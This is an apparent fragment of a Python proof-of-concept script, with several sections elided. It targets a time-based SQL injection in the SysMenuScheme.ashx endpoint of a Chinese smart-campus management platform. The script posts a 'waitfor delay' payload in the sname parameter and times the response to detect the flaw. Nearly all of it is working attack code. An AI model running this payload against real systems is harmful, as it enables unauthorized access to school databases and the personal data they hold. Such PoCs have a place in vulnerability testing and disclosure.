...
def poc(target):
    ...
    payload = "/Module/Kernel/Controller/SysMenuScheme.ashx"
    ...
    data= '''action=exportExcel&sname='waitfor+delay'0:0:4'--'''
    ...
    try:
        ...
        start_time = time.time()
        re2 = requests.post(url=target_url, headers=headers,data=data, timeout=15, verify=False)
...
def main():
    ...
    parser = argparse.ArgumentParser(
        description="智慧校园综合管理平台(安校易) SysMenuScheme.ashx sql注入漏洞",
